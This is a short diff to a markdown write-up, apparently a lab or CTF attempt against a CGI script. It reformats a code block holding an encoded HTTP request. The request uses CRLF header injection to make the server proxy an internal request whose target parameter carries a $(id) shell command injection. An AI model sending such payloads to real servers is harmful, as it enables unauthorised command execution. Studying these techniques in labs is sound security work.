@@ -189,8 +189,11 @@ Content-type: proxy:http://127.0.0.1/cgi-bin/attack-ip?target=127.0.0.1%$(id)&na
 
  HTTP/1.1
  ```
+
 Encoded URL: (Always Ensure URL Encodeing)!
-```GET /cgi-bin/attack-domain?target=Glitch&name=a1%0d%0aLocation:+/azx%0d%0aContent-type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%$(id)%26name=%0d%0a%0d%0a HTTP/1.1```
+```
+GET /cgi-bin/attack-domain?target=Glitch&name=a1%0d%0aLocation:+/azx%0d%0aContent-type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%$(id)%26name=%0d%0a%0d%0a HTTP/1.1
+```
 
 but I got the following response:
 
